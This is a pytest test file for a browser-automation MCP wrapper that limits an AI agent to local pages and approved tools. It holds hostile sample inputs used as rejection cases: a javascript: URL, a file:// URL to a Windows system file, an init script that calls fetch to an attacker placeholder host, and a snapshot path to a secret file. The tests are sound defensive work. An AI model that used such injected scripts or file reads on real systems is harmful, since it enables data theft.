import asyncio
from types import SimpleNamespace

import pytest

import central.browser_mcp as browser_mcp
from central.browser_mcp import _call, approval_summary, execute, validate_request


@pytest.mark.parametrize('url', [
    'http://localhost:53210/',
    'http://127.0.0.1:8765/',
    'https://[::1]:9000/app',
])
def test_browser_mcp_allows_loopback_navigation_only(url):
    tool, arguments = validate_request({
        'action': 'browser_tool', 'tool': 'new_page',
        'arguments': {'url': url},
    })
    assert tool == 'new_page'
    assert arguments['url'] == url


@pytest.mark.parametrize('url', [
    'https://example.com/',
    'file:///C:/Windows/win.ini',
    'javascript:alert(1)',
    'http://user:password@localhost/',
    'http://localhost:0/',
])
def test_browser_mcp_rejects_nonlocal_or_unsafe_urls(url):
    with pytest.raises(ValueError):
        validate_request({
            'action': 'browser_tool', 'tool': 'navigate_page',
            'arguments': {'url': url, 'pageId': 1},
        })


@pytest.mark.parametrize('browser_request', [
    {'action': 'browser_tool', 'tool': 'evaluate_script', 'arguments': {}},
    {'action': 'browser_tool', 'tool': 'navigate_page',
     'arguments': {'url': 'http://localhost:53210/', 'pageId': 1,
                   'initScript': 'fetch("https://attacker.invalid")'}},
    {'action': 'browser_tool', 'tool': 'take_snapshot',
     'arguments': {'pageId': 1, 'filePath': 'C:/secret.txt'}},
    {'action': 'browser_tool', 'tool': 'navigate_page',
     'arguments': {'url': 'http://localhost:53210/', 'pageId': True}},
])
def test_browser_mcp_rejects_unapproved_tools_and_arguments(browser_request):
    with pytest.raises(ValueError):
        validate_request(browser_request)


def test_browser_mcp_approval_summary_names_the_local_tool_and_arguments():
    summary = approval_summary({
        'action': 'browser_tool', 'tool': 'take_snapshot',
        'arguments': {'pageId': 3},
    })
    assert 'take_snapshot' in summary['description']
    assert 'pageId' in summary['description']
    assert 'aprovação' in summary['description'].lower()


class FakeSession:
    def __init__(self, pages):
        self.pages = pages
        self.calls = []

    async def call_tool(self, name, arguments):
        self.calls.append((name, arguments))
        if name == 'list_pages':
            return SimpleNamespace(structuredContent={'pages': self.pages},
                                   content=[], isError=False)
        if name == 'select_page':
            for page in self.pages:
                page['selected'] = page['id'] == arguments['pageId']
            return SimpleNamespace(content=[], isError=False)
        if name == 'take_snapshot':
            assert 'pageId' not in arguments
            return SimpleNamespace(
                structuredContent={'snapshot': 'heading local'},
                content=[SimpleNamespace(type='text', text='heading local')],
                isError=False)
        raise AssertionError('Unexpected tool call')

    async def list_tools(self):
        return SimpleNamespace(tools=[
            SimpleNamespace(name='list_pages'),
            SimpleNamespace(name='take_snapshot'),
        ])


def test_browser_mcp_filters_nonlocal_tabs_and_checks_page_scope():
    async def scenario():
        session = FakeSession([
            {'id': 1, 'url': 'http://127.0.0.1:53210/', 'selected': True},
            {'id': 2, 'url': 'https://example.com/', 'selected': False},
        ])
        pages = await _call(session, 'list_pages', {})
        assert [page['pageId'] for page in pages['pages']] == [1]
        result = await _call(session, 'take_snapshot', {'pageId': 1})
        assert result['success']
        with pytest.raises(ValueError, match='local'):
            await _call(session, 'take_snapshot', {'pageId': 2})
        assert [name for name, _ in session.calls].count('take_snapshot') == 1
    asyncio.run(scenario())


@pytest.mark.parametrize('tool', [
    'take_snapshot', 'list_console_messages', 'lighthouse_audit', 'get_css_styles',
    'navigate_page',
])
def test_scoped_page_id_selects_local_tab_without_forwarding_unsupported_argument(tool):
    class PinnedSession(FakeSession):
        async def list_tools(self):
            return SimpleNamespace(tools=[SimpleNamespace(name=tool)])

        async def call_tool(self, name, arguments):
            if name in ('list_pages', 'select_page'):
                return await super().call_tool(name, arguments)
            assert name == tool
            assert 'pageId' not in arguments
            assert self.pages[1]['selected']
            self.calls.append((name, arguments))
            return SimpleNamespace(content=[], isError=False, structuredContent=None)

    async def scenario():
        session = PinnedSession([
            {'id': 1, 'url': 'https://example.com/', 'selected': True},
            {'id': 2, 'url': 'http://127.0.0.1:8770/', 'selected': False},
        ])
        arguments = {'pageId': 2}
        if tool == 'navigate_page':
            arguments['url'] = 'http://127.0.0.1:8770/'
        result = await _call(session, tool, arguments)
        assert result['success']
        assert ('select_page', {'pageId': 2}) in session.calls
        assert arguments['pageId'] == 2
    asyncio.run(scenario())


def test_scope_is_rechecked_after_selecting_a_page():
    class RedirectingSession(FakeSession):
        async def call_tool(self, name, arguments):
            result = await super().call_tool(name, arguments)
            if name == 'select_page':
                self.pages[0]['url'] = 'https://example.com/'
            return result

    async def scenario():
        session = RedirectingSession([
            {'id': 1, 'url': 'http://127.0.0.1:8770/', 'selected': True},
        ])
        with pytest.raises(ValueError, match='local'):
            await _call(session, 'take_snapshot', {'pageId': 1})
        assert not any(name == 'take_snapshot' for name, _ in session.calls)
    asyncio.run(scenario())


def test_browser_mcp_surfaces_server_error_details():
    class FailingSession:
        async def call_tool(self, name, arguments):
            if name == 'list_pages':
                return SimpleNamespace(structuredContent={'pages': []},
                                       content=[], isError=False)
            return SimpleNamespace(
                structuredContent=None,
                content=[SimpleNamespace(type='text', text='net::ERR_CONNECTION_REFUSED')],
                isError=True,
            )

        async def list_tools(self):
            return SimpleNamespace(tools=[SimpleNamespace(name='new_page')])

    async def scenario():
        with pytest.raises(RuntimeError, match='net::ERR_CONNECTION_REFUSED'):
            await _call(FailingSession(), 'new_page', {
                'url': 'http://127.0.0.1:53210/',
            })

    asyncio.run(scenario())


def test_browser_mcp_rechecks_activation_before_every_call():
    class DisabledDatabase:
        def one(self, query, parameters=()):
            return None

    async def scenario():
        with pytest.raises(RuntimeError, match='desativado'):
            await execute(DisabledDatabase(), 'user', 'run', {
                'action': 'browser_tool', 'tool': 'list_pages', 'arguments': {},
            })

    asyncio.run(scenario())


def test_browser_mcp_closes_session_and_locks_at_run_end():
    class FakeStack:
        closed = False

        async def aclose(self):
            self.closed = True

    async def scenario():
        run_id = 'cleanup-test'
        key = browser_mcp._loop_key(run_id)
        stack = FakeStack()
        browser_mcp._sessions[key] = {'stack': stack}
        browser_mcp._session_locks[key] = asyncio.Lock()
        await browser_mcp.close_run(run_id)
        assert stack.closed
        assert key not in browser_mcp._sessions
        assert key not in browser_mcp._session_locks

    asyncio.run(scenario())

def test_browser_mcp_parses_text_only_page_listing_without_trusting_urls():
    result = SimpleNamespace(structuredContent=None, content=[
        SimpleNamespace(type='text', text=(
            '## Pages\n1: about:blank\n'
            '2: NOVA STUDIO (http://127.0.0.1:53210/) [selected]\n'
            '3: https://example.com/\n'
            '4: http://localhost:8765/docs [selected] isolatedContext=project\n')),
    ])
    pages = browser_mcp._pages(result)
    assert pages == [
        {'id': 1, 'url': 'about:blank', 'selected': False},
        {'id': 2, 'url': 'http://127.0.0.1:53210/', 'selected': True},
        {'id': 3, 'url': 'https://example.com/', 'selected': False},
        {'id': 4, 'url': 'http://localhost:8765/docs', 'selected': True},
    ]
    assert [page['id'] for page in pages if browser_mcp._page_is_local(page)] == [2, 4]

def test_browser_mcp_accepts_only_supported_before_unload_values():
    base = {'action': 'browser_tool', 'tool': 'navigate_page',
            'arguments': {'pageId': 1, 'url': 'http://localhost:53210/',
                          'handleBeforeUnload': 'decline'}}
    assert validate_request(base)[0] == 'navigate_page'
    base['arguments']['handleBeforeUnload'] = 'dismiss'
    with pytest.raises(ValueError, match='navega'):
        validate_request(base)

def test_browser_mcp_navigation_patterns_construct_in_node():
    import shutil
    import subprocess
    node = shutil.which('node')
    if not node:
        pytest.skip('Node.js unavailable')
    patterns = browser_mcp.NAVIGATION_ALLOWLIST.split(',')
    script = ('for (const pattern of process.argv.slice(1)) {'
              ' const parsed = new URLPattern(pattern);'
              ' if (!parsed.test(pattern.startsWith("https")'
              ' ? "https://[::1]:8765/" : "http://[::1]:8765/")'
              ' && pattern.includes(":1")) process.exit(2);'
              '}')
    result = subprocess.run([node, '-e', script, *patterns],
                            capture_output=True, text=True, timeout=10)
    assert result.returncode == 0, result.stderr
